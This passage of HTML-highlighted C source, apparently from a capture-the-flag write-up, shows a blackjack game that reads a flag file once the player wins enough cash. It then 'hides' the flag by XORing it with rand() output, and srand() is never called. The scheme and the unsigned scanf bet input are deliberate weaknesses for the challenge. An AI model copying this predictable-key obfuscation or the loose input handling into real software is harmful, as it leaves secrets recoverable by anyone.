class="line">    &#125;</span><br><span class="line">     </span><br><span class="line">    <span class="keyword">if</span>(k==<span class="number">13</span>) <span class="comment">//If random number is 13, print card with K (King) on face</span></span><br><span class="line">    &#123;</span><br><span class="line">    <span class="comment">//Diamond Card</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"-------\n"</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"|%c    |\n"</span>, diamond);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"|  K  |\n"</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"|    %c|\n"</span>, diamond);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"-------\n"</span>);</span><br><span class="line">    k=<span class="number">10</span>; <span class="comment">//Set card value to 10</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> k;</span><br><span class="line">&#125;<span class="comment">// End function</span></span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">heartcard</span><span class="params">()</span> <span class="comment">//Displays Heart Card Image</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">     </span><br><span class="line">     </span><br><span class="line">   <span class="comment">// srand((unsigned) time(NULL)); //Generates random seed for rand() function</span></span><br><span class="line">    k=rand()%<span class="number">13</span>+<span class="number">1</span>;</span><br><span class="line">     </span><br><span class="line">    <span class="keyword">if</span>(k&lt;=<span class="number">9</span>) <span class="comment">//If random number is 9 or less, print card with that number</span></span><br><span class="line">    &#123;</span><br><span class="line">    <span class="comment">//Heart Card</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"-------\n"</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"|%c    |\n"</span>, heart); </span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"|  %d  |\n"</span>, k);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"|    %c|\n"</span>, heart);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"-------\n"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">     </span><br><span class="line">    <span class="keyword">if</span>(k==<span class="number">10</span>) <span class="comment">//If random number is 10, print card with J (Jack) on face</span></span><br><span class="line">    &#123;</span><br><span class="line">    <span class="comment">//Heart Card</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"-------\n"</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"|%c    |\n"</span>, heart);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"|  J  |\n"</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"|    %c|\n"</span>, heart);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"-------\n"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">     </span><br><span class="line">    <span class="keyword">if</span>(k==<span class="number">11</span>) <span class="comment">//If random number is 11, print card with A (Ace) on face</span></span><br><span class="line">    &#123;</span><br><span class="line">    <span class="comment">//Heart Card</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"-------\n"</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"|%c    |\n"</span>, heart);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"|  A  |\n"</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"|    %c|\n"</span>, heart);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"-------\n"</span>);</span><br><span class="line">    <span class="keyword">if</span>(player_total&lt;=<span class="number">10</span>) <span class="comment">//If random number is Ace, change value to 11 or 1 depending on dealer total</span></span><br><span class="line">         &#123;</span><br><span class="line">             k=<span class="number">11</span>;</span><br><span class="line">         &#125;</span><br><span class="line">          </span><br><span class="line">         <span class="keyword">else</span></span><br><span class="line">         &#123;</span><br><span class="line">             k=<span class="number">1</span>;</span><br><span class="line">         &#125;</span><br><span class="line">    &#125;</span><br><span class="line">     </span><br><span class="line">    <span class="keyword">if</span>(k==<span class="number">12</span>) <span class="comment">//If random number is 12, print card with Q (Queen) on face</span></span><br><span class="line">    &#123;</span><br><span class="line">    <span class="comment">//Heart Card</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"-------\n"</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"|%c    |\n"</span>, heart);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"|  Q  |\n"</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"|    %c|\n"</span>, heart);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"-------\n"</span>);</span><br><span class="line">    k=<span class="number">10</span>; <span class="comment">//Set card value to 10</span></span><br><span class="line">    &#125;</span><br><span class="line">     </span><br><span class="line">    <span class="keyword">if</span>(k==<span class="number">13</span>) <span class="comment">//If random number is 13, print card with K (King) on face</span></span><br><span class="line">    &#123;</span><br><span class="line">    <span class="comment">//Heart Card</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"-------\n"</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"|%c    |\n"</span>, heart);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"|  K  |\n"</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"|    %c|\n"</span>, heart);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"-------\n"</span>);</span><br><span class="line">    k=<span class="number">10</span>; <span class="comment">//Set card value to 10</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> k;</span><br><span class="line">&#125; <span class="comment">// End Function</span></span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">spadecard</span><span class="params">()</span> <span class="comment">//Displays Spade Card Image</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">     </span><br><span class="line">     </span><br><span class="line">   <span class="comment">// srand((unsigned) time(NULL)); //Generates random seed for rand() function</span></span><br><span class="line">    k=rand()%<span class="number">13</span>+<span class="number">1</span>;</span><br><span class="line">     </span><br><span class="line">    <span class="keyword">if</span>(k&lt;=<span class="number">9</span>) <span class="comment">//If random number is 9 or less, print card with that number</span></span><br><span class="line">    &#123;</span><br><span class="line">    <span class="comment">//Spade Card</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"-------\n"</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"|%c    |\n"</span>, spade);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"|  %d  |\n"</span>, k);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"|    %c|\n"</span>, spade);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"-------\n"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">     </span><br><span class="line">    <span class="keyword">if</span>(k==<span class="number">10</span>) <span class="comment">//If random number is 10, print card with J (Jack) on face</span></span><br><span class="line">    &#123;</span><br><span class="line">    <span class="comment">//Spade Card</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"-------\n"</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"|%c    |\n"</span>, spade);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"|  J  |\n"</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"|    %c|\n"</span>, spade);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"-------\n"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">     </span><br><span class="line">    <span class="keyword">if</span>(k==<span class="number">11</span>) <span class="comment">//If random number is 11, print card with A (Ace) on face</span></span><br><span class="line">    &#123;</span><br><span class="line">    <span class="comment">//Spade Card</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"-------\n"</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"|%c    |\n"</span>, spade);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"|  A  |\n"</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"|    %c|\n"</span>, spade);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"-------\n"</span>);</span><br><span class="line">    <span class="keyword">if</span>(player_total&lt;=<span class="number">10</span>) <span class="comment">//If random number is Ace, change value to 11 or 1 depending on dealer total</span></span><br><span class="line">         &#123;</span><br><span class="line">             k=<span class="number">11</span>;</span><br><span class="line">         &#125;</span><br><span class="line">          </span><br><span class="line">         <span class="keyword">else</span></span><br><span class="line">         &#123;</span><br><span class="line">             k=<span class="number">1</span>;</span><br><span class="line">         &#125;</span><br><span class="line">    &#125;</span><br><span class="line">     </span><br><span class="line">    <span class="keyword">if</span>(k==<span class="number">12</span>) <span class="comment">//If random number is 12, print card with Q (Queen) on face</span></span><br><span class="line">    &#123;</span><br><span class="line">    <span class="comment">//Spade Card</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"-------\n"</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"|%c    |\n"</span>, spade);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"|  Q  |\n"</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"|    %c|\n"</span>, spade);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"-------\n"</span>);</span><br><span class="line">    k=<span class="number">10</span>; <span class="comment">//Set card value to 10</span></span><br><span class="line">    &#125;</span><br><span class="line">     </span><br><span class="line">    <span class="keyword">if</span>(k==<span class="number">13</span>) <span class="comment">//If random number is 13, print card with K (King) on face</span></span><br><span class="line">    &#123;</span><br><span class="line">    <span class="comment">//Spade Card</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"-------\n"</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"|%c    |\n"</span>, spade);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"|  K  |\n"</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"|    %c|\n"</span>, spade);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"-------\n"</span>);</span><br><span class="line">    k=<span class="number">10</span>; <span class="comment">//Set card value to 10</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> k;</span><br><span class="line">&#125; <span class="comment">// End Function</span></span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">randcard</span><span class="params">()</span> <span class="comment">//Generates random card</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">      </span><br><span class="line">                </span><br><span class="line">    <span class="comment">// srand((unsigned) time(NULL)); //Generates random seed for rand() function</span></span><br><span class="line">     random_card = rand()%<span class="number">4</span>+<span class="number">1</span>;</span><br><span class="line">      </span><br><span class="line">     <span class="keyword">if</span>(random_card==<span class="number">1</span>)</span><br><span class="line">     &#123;   </span><br><span class="line">         clubcard();</span><br><span class="line">         l=k;</span><br><span class="line">     &#125;</span><br><span class="line">      </span><br><span class="line">     <span class="keyword">if</span>(random_card==<span class="number">2</span>)</span><br><span class="line">     &#123;</span><br><span class="line">         diamondcard();</span><br><span class="line">         l=k;</span><br><span class="line">     &#125;</span><br><span class="line">      </span><br><span class="line">     <span class="keyword">if</span>(random_card==<span class="number">3</span>)</span><br><span class="line">     &#123;</span><br><span class="line">         heartcard();</span><br><span class="line">         l=k;</span><br><span class="line">     &#125;</span><br><span class="line">          </span><br><span class="line">     <span class="keyword">if</span>(random_card==<span class="number">4</span>)</span><br><span class="line">     &#123;</span><br><span class="line">         spadecard();</span><br><span class="line">         l=k;</span><br><span class="line">     &#125;    </span><br><span class="line">     <span class="keyword">return</span> l;</span><br><span class="line">&#125; <span class="comment">// End Function   </span></span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">play</span><span class="params">()</span> <span class="comment">//Plays game</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">      </span><br><span class="line">     <span class="keyword">int</span> p=<span class="number">0</span>; <span class="comment">// holds value of player_total</span></span><br><span class="line">     <span class="keyword">int</span> i=<span class="number">1</span>; <span class="comment">// counter for asking user to hold or stay (aka game turns)</span></span><br><span class="line">     <span class="keyword">char</span> choice3;</span><br><span class="line">     player_total=<span class="number">0</span>;</span><br><span class="line">     dealer_total=<span class="number">0</span>;</span><br><span class="line">     cash = cash;</span><br><span class="line">     cash_test();</span><br><span class="line">     <span class="built_in">printf</span>(<span class="string">"\nCash: $%d\n"</span>,cash); <span class="comment">//Prints amount of cash user has</span></span><br><span class="line">     randcard(); <span class="comment">//Generates random card</span></span><br><span class="line">     player_total = p + l; <span class="comment">//Computes player total</span></span><br><span class="line">     p = player_total;</span><br><span class="line">     <span class="built_in">printf</span>(<span class="string">"\nYour Total is %d\n"</span>, p); <span class="comment">//Prints player total</span></span><br><span class="line">     dealer(); <span class="comment">//Computes and prints dealer total</span></span><br><span class="line">     betting(); <span class="comment">//Prompts user to enter bet amount</span></span><br><span class="line">        </span><br><span class="line">     <span class="keyword">while</span>(i&lt;=<span class="number">21</span>) <span class="comment">//While loop used to keep asking user to hit or stay at most twenty-one times</span></span><br><span class="line">                  <span class="comment">//  because there is a chance user can generate twenty-one consecutive 1's</span></span><br><span class="line">     &#123;</span><br><span class="line">         <span class="keyword">if</span>(p==<span class="number">21</span>) <span class="comment">//If user total is 21, win</span></span><br><span class="line">         &#123;</span><br><span class="line">             <span class="built_in">printf</span>(<span class="string">"\nUnbelievable! You Win!\n"</span>);</span><br><span class="line">             won = won+<span class="number">1</span>;</span><br><span class="line">             cash = cash+bet;</span><br><span class="line">             <span class="built_in">printf</span>(<span class="string">"\nYou have %d Wins and %d Losses. Awesome!\n"</span>, won, loss);</span><br><span class="line">             dealer_total=<span class="number">0</span>;</span><br><span class="line">             askover();</span><br><span class="line">         &#125;</span><br><span class="line">      </span><br><span class="line">         <span class="keyword">if</span>(p&gt;<span class="number">21</span>) <span class="comment">//If player total is over 21, loss</span></span><br><span class="line">         &#123;</span><br><span class="line">             <span class="built_in">printf</span>(<span class="string">"\nWoah Buddy, You Went WAY over.\n"</span>);</span><br><span class="line">             loss = loss+<span class="number">1</span>;</span><br><span class="line">             cash = cash - bet;</span><br><span class="line">             <span class="built_in">printf</span>(<span class="string">"\nYou have %d Wins and %d Losses. Awesome!\n"</span>, won, loss);</span><br><span class="line">             dealer_total=<span class="number">0</span>;</span><br><span class="line">             askover();</span><br><span class="line">         &#125;</span><br><span class="line">      </span><br><span class="line">         <span class="keyword">if</span>(p&lt;=<span class="number">21</span>) <span class="comment">//If player total is less than 21, ask to hit or stay</span></span><br><span class="line">         &#123;         </span><br><span class="line">             <span class="built_in">printf</span>(<span class="string">"\n\nWould You Like to Hit or Stay?"</span>);</span><br><span class="line">              </span><br><span class="line">             <span class="built_in">scanf</span>(<span class="string">"%c"</span>, &amp;choice3);</span><br><span class="line">             <span class="keyword">while</span>((choice3!=<span class="string">'H'</span>) &amp;&amp; (choice3!=<span class="string">'h'</span>) &amp;&amp; (choice3!=<span class="string">'S'</span>) &amp;&amp; (choice3!=<span class="string">'s'</span>)) <span class="comment">// If invalid choice entered</span></span><br><span class="line">             &#123;                                                                           </span><br><span class="line">                 <span class="built_in">printf</span>(<span class="string">"\n"</span>);</span><br><span class="line">                 <span class="built_in">printf</span>(<span class="string">"Please Enter H to Hit or S to Stay.\n"</span>);</span><br><span class="line">                 <span class="built_in">scanf</span>(<span class="string">"%c"</span>,&amp;choice3);</span><br><span class="line">             &#125;</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">             <span class="keyword">if</span>((choice3==<span class="string">'H'</span>) || (choice3==<span class="string">'h'</span>)) <span class="comment">// If Hit, continues</span></span><br><span class="line">             &#123; </span><br><span class="line">                 randcard();</span><br><span class="line">                 player_total = p + l;</span><br><span class="line">                 p = player_total;</span><br><span class="line">                 <span class="built_in">printf</span>(<span class="string">"\nYour Total is %d\n"</span>, p);</span><br><span class="line">                 dealer();</span><br><span class="line">                  <span class="keyword">if</span>(dealer_total==<span class="number">21</span>) <span class="comment">//Is dealer total is 21, loss</span></span><br><span class="line">                  &#123;</span><br><span class="line">                      <span class="built_in">printf</span>(<span class="string">"\nDealer Has the Better Hand. You Lose.\n"</span>);</span><br><span class="line">                      loss = loss+<span class="number">1</span>;</span><br><span class="line">                      cash = cash - bet;</span><br><span class="line">                      <span class="built_in">printf</span>(<span class="string">"\nYou have %d Wins and %d Losses. Awesome!\n"</span>, won, loss);</span><br><span class="line">                      dealer_total=<span class="number">0</span>;</span><br><span class="line">                      askover();</span><br><span class="line">                  &#125; </span><br><span class="line">      </span><br><span class="line">                  <span class="keyword">if</span>(dealer_total&gt;<span class="number">21</span>) <span class="comment">//If dealer total is over 21, win</span></span><br><span class="line">                  &#123;                      </span><br><span class="line">                      <span class="built_in">printf</span>(<span class="string">"\nDealer Has Went Over!. You Win!\n"</span>);</span><br><span class="line">                      won = won+<span class="number">1</span>;</span><br><span class="line">                      cash = cash+bet;</span><br><span class="line">                      <span class="built_in">printf</span>(<span class="string">"\nYou have %d Wins and %d Losses. Awesome!\n"</span>, won, loss);</span><br><span class="line">                      dealer_total=<span class="number">0</span>;</span><br><span class="line">                      askover();</span><br><span class="line">                  &#125;</span><br><span class="line">             &#125;</span><br><span class="line">             <span class="keyword">if</span>((choice3==<span class="string">'S'</span>) || (choice3==<span class="string">'s'</span>)) <span class="comment">// If Stay, does not continue</span></span><br><span class="line">             &#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">"\nYou Have Chosen to Stay at %d. Wise Decision!\n"</span>, player_total);</span><br><span class="line">                stay();</span><br><span class="line">             &#125;</span><br><span class="line">          &#125;</span><br><span class="line">             i++; <span class="comment">//While player total and dealer total are less than 21, re-do while loop </span></span><br><span class="line">     &#125; <span class="comment">// End While Loop</span></span><br><span class="line">&#125; <span class="comment">// End Function</span></span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">dealer</span><span class="params">()</span> <span class="comment">//Function to play for dealer AI</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">     <span class="keyword">int</span> z;</span><br><span class="line">      </span><br><span class="line">     <span class="keyword">if</span>(dealer_total&lt;<span class="number">17</span>)</span><br><span class="line">     &#123;</span><br><span class="line">    <span class="comment">//  srand((unsigned) time(NULL) + 1); //Generates random seed for rand() function</span></span><br><span class="line">      z=rand()%<span class="number">13</span>+<span class="number">1</span>;</span><br><span class="line">      <span class="keyword">if</span>(z&lt;=<span class="number">10</span>) <span class="comment">//If random number generated is 10 or less, keep that value</span></span><br><span class="line">      &#123;</span><br><span class="line">         d=z;</span><br><span class="line">          </span><br><span class="line">      &#125;</span><br><span class="line">      </span><br><span class="line">      <span class="keyword">if</span>(z&gt;<span class="number">11</span>) <span class="comment">//If random number generated is more than 11, change value to 10</span></span><br><span class="line">      &#123;</span><br><span class="line">         d=<span class="number">10</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      </span><br><span class="line">      <span class="keyword">if</span>(z==<span class="number">11</span>) <span class="comment">//If random number is 11(Ace), change value to 11 or 1 depending on dealer total</span></span><br><span class="line">      &#123;</span><br><span class="line">         <span class="keyword">if</span>(dealer_total&lt;=<span class="number">10</span>)</span><br><span class="line">         &#123;</span><br><span class="line">             d=<span class="number">11</span>;</span><br><span class="line">         &#125;</span><br><span class="line">          </span><br><span class="line">         <span class="keyword">else</span></span><br><span class="line">         &#123;</span><br><span class="line">             d=<span class="number">1</span>;</span><br><span class="line">         &#125;</span><br><span class="line">      &#125;</span><br><span class="line">     dealer_total = dealer_total + d;</span><br><span class="line">     &#125;</span><br><span class="line">           </span><br><span class="line">     <span class="built_in">printf</span>(<span class="string">"\nThe Dealer Has a Total of %d"</span>, dealer_total); <span class="comment">//Prints dealer total</span></span><br><span class="line">      </span><br><span class="line">&#125; <span class="comment">// End Function </span></span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">stay</span><span class="params">()</span> <span class="comment">//Function for when user selects 'Stay'</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">     dealer(); <span class="comment">//If stay selected, dealer continues going</span></span><br><span class="line">     <span class="keyword">if</span>(dealer_total&gt;=<span class="number">17</span>)</span><br><span class="line">     &#123;</span><br><span class="line">      <span class="keyword">if</span>(player_total&gt;=dealer_total) <span class="comment">//If player's total is more than dealer's total, win</span></span><br><span class="line">      &#123;</span><br><span class="line">         <span class="built_in">printf</span>(<span class="string">"\nUnbelievable! You Win!\n"</span>);</span><br><span class="line">         won = won+<span class="number">1</span>;</span><br><span class="line">         cash = cash+bet;</span><br><span class="line">         <span class="built_in">printf</span>(<span class="string">"\nYou have %d Wins and %d Losses. Awesome!\n"</span>, won, loss);</span><br><span class="line">         dealer_total=<span class="number">0</span>;</span><br><span class="line">         askover();</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">if</span>(dealer_total&gt;<span class="number">21</span>) <span class="comment">//If dealer's total is more than 21, win</span></span><br><span class="line">      &#123;</span><br><span class="line">         <span class="built_in">printf</span>(<span class="string">"\nUnbelievable! You Win!\n"</span>);</span><br><span class="line">         won = won+<span class="number">1</span>;</span><br><span class="line">         cash = cash+bet;</span><br><span class="line">         <span class="built_in">printf</span>(<span class="string">"\nYou have %d Wins and %d Losses. Awesome!\n"</span>, won, loss);</span><br><span class="line">         dealer_total=<span class="number">0</span>;</span><br><span class="line">         askover();</span><br><span class="line">      &#125;      </span><br><span class="line">      <span class="keyword">if</span>(player_total&lt;dealer_total) <span class="comment">//If player's total is less than dealer's total, loss</span></span><br><span class="line">      &#123;</span><br><span class="line">         <span class="built_in">printf</span>(<span class="string">"\nDealer Has the Better Hand. You Lose.\n"</span>);</span><br><span class="line">         loss = loss+<span class="number">1</span>;</span><br><span class="line">         cash = cash - bet;</span><br><span class="line">         <span class="built_in">printf</span>(<span class="string">"\nYou have %d Wins and %d Losses. Awesome!\n"</span>, won, loss);</span><br><span class="line">         dealer_total=<span class="number">0</span>;</span><br><span class="line">         askover();</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">     &#125;</span><br><span class="line">     <span class="keyword">else</span></span><br><span class="line">     &#123;</span><br><span class="line">         stay();</span><br><span class="line">     &#125;</span><br><span class="line">      </span><br><span class="line">&#125; <span class="comment">// End Function</span></span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">cash_test</span><span class="params">()</span> <span class="comment">//Test for if user has cash remaining in purse</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">     <span class="keyword">if</span> (cash &lt;= <span class="number">0</span>) <span class="comment">//Once user has zero remaining cash, game ends and prompts user to play again</span></span><br><span class="line">     &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"You Are Bankrupt. Game Over"</span>);</span><br><span class="line">        <span class="comment">//cash = 500;</span></span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">        <span class="comment">//askover();</span></span><br><span class="line">     &#125;</span><br><span class="line">     <span class="keyword">if</span>(cash&gt;=WIN_SUM)&#123;</span><br><span class="line">     <span class="keyword">int</span> id;</span><br><span class="line">     <span class="keyword">int</span> length;</span><br><span class="line">     <span class="keyword">char</span> buffer[<span class="number">100</span>];</span><br><span class="line">     <span class="keyword">char</span> *key=<span class="number">0</span>;</span><br><span class="line">     id = open(<span class="string">"/home/tsctf/flag/flag"</span>,O_RDONLY,S_IRUSR );</span><br><span class="line">     <span class="keyword">if</span>(id &lt;<span class="number">0</span>)&#123;</span><br><span class="line">     <span class="built_in">printf</span>(<span class="string">"flag file error~!\n"</span>);</span><br><span class="line">     <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">     &#125;</span><br><span class="line">     length = read(id,buffer,<span class="number">100</span>);</span><br><span class="line">     <span class="keyword">if</span> (length&lt;<span class="number">0</span>)&#123;</span><br><span class="line">     <span class="built_in">printf</span>(<span class="string">"read error~!\n"</span>);</span><br><span class="line">     <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">     &#125;</span><br><span class="line">     buffer[length] = <span class="string">'\0'</span>;</span><br><span class="line">     length = <span class="built_in">strlen</span>(buffer);</span><br><span class="line">     key = <span class="built_in">malloc</span>(length);</span><br><span class="line">     <span class="keyword">for</span>(<span class="keyword">int</span> i =<span class="number">0</span> ; i&lt;length;i++)&#123;</span><br><span class="line">     <span class="comment">//printf("%d ",key[i*4]);</span></span><br><span class="line">     key[i]=(rand()%<span class="number">256</span>);</span><br><span class="line">     &#125;</span><br><span class="line">     <span class="comment">//printf("%d",(length/4)*4);</span></span><br><span class="line">     <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>;i&lt;length;i++)&#123;</span><br><span class="line">     <span class="comment">//printf("%2x",key[i]);</span></span><br><span class="line">     buffer[i] = buffer[i]^key[i];</span><br><span class="line">     &#125;</span><br><span class="line">     <span class="built_in">puts</span>(<span class="string">"d(`･∀･)b:"</span>);</span><br><span class="line">     <span class="built_in">puts</span>(<span class="string">"OK, you win,"</span>);</span><br><span class="line">     <span class="built_in">puts</span>(<span class="string">"I won't give u real flag :"</span>);</span><br><span class="line">        write(<span class="number">1</span>,buffer,length);</span><br><span class="line">     close(id);</span><br><span class="line">     <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">     &#125;</span><br><span class="line">&#125; <span class="comment">// End Function</span></span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">betting</span><span class="params">()</span> <span class="comment">//Asks user amount to bet</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"> <span class="built_in">printf</span>(<span class="string">"\n\nEnter Bet: $"</span>);</span><br><span class="line"> <span class="built_in">scanf</span>(<span class="string">"%u"</span>, &amp;bet);</span><br><span class="line"> </span><br><span class="line"> <span class="keyword">while</span> ((bet &gt; cash) || (bet == <span class="number">0</span>))<span class="comment">//If player tries to bet more money than player has</span></span><br><span class="line"> &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"\nAre you kidding me? "</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"\nEnter Bet: "</span>);</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">"%u"</span>, &amp;bet);</span><br><span class="line">        <span class="comment">//return bet;</span></span><br><span class="line"> &#125;</span><br><span class="line"><span class="keyword">return</span> bet;</span><br><span class="line">&#125; <span class="comment">// End Function</span></span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">askover</span><span class="params">()</span> <span class="comment">// Function for asking player if they want to play again</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> choice1;</span><br><span class="line">         </span><br><span class="line">     <span class="built_in">printf</span>(<span class="string">"\nWould You Like To Play Again?"</span>);</span><br><span class="line">     <span class="built_in">printf</span>(<span class="string">"\nPlease Enter Y for Yes or N for No\n"</span>);</span><br><span class="line">     <span class="built_in">scanf</span>(<span class="string">"\n%c"</span>,&amp;choice1);</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">while</span>((choice1!=<span class="string">'Y'</span>) &amp;&amp; (choice1!=<span class="string">'y'</span>) &amp;&amp; (choice1!=<span class="string">'N'</span>) &amp;&amp; (choice1!=<span class="string">'n'</span>)) <span class="comment">// If invalid choice entered</span></span><br><span class="line">    &#123;                                                                           </span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"\n"</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"Incorrect Choice. Please Enter Y for Yes or N for No.\n"</span>);</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">"%c"</span>,&amp;choice1);</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">    <span class="keyword">if</span>((choice1 == <span class="string">'Y'</span>) || (choice1 == <span class="string">'y'</span>)) <span class="comment">// If yes, continue.</span></span><br><span class="line">    &#123; </span><br><span class="line">          <span class="comment">//  system("clear");</span></span><br><span class="line">            play();</span><br><span class="line">    &#125;</span><br><span class="line">  </span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span>((choice1 == <span class="string">'N'</span>) || (choice1 == <span class="string">'n'</span>)) <span class="comment">// If no, exit program</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">//fileresults();</span></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"\nBYE!!!!\n\n"</span>);</span><br><span class="line">        <span class="comment">//system("pause");</span></span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125; <span class="comment">// End function</span></span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">fileresults</span><span class="params">()</span> <span class="comment">//Prints results into Blackjack.txt file in program directory</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    FILE *fpresults; <span class="comment">//File pointer is fpresults</span></span><br><span class="line">    fpresults = fopen(RESULTS, <span class="string">"w"</span>); <span class="comment">//Creates file and writes into it</span></span><br><span class="line">    <span class="keyword">if</span>(fpresults == <span class="literal">NULL</span>) <span class="comment">// what to do if file missing from directory</span></span><br><span class="line">    &#123;</span><br><span class="line">               <span class="built_in">printf</span>(<span class="string">"\nError: File Missing\n"</span>);</span><br><span class="line">               <span class="comment">//system("pause");</span></span><br><span class="line">               <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;     </span><br><span class="line">     <span class="built_in">fprintf</span>(fpresults,<span class="string">"\n\t RESULTS"</span>);</span><br><span class="line">     <span class="built_in">fprintf</span>(fpresults,<span class="string">"\n\t---------\n"</span>);</span><br><span class="line">     <span 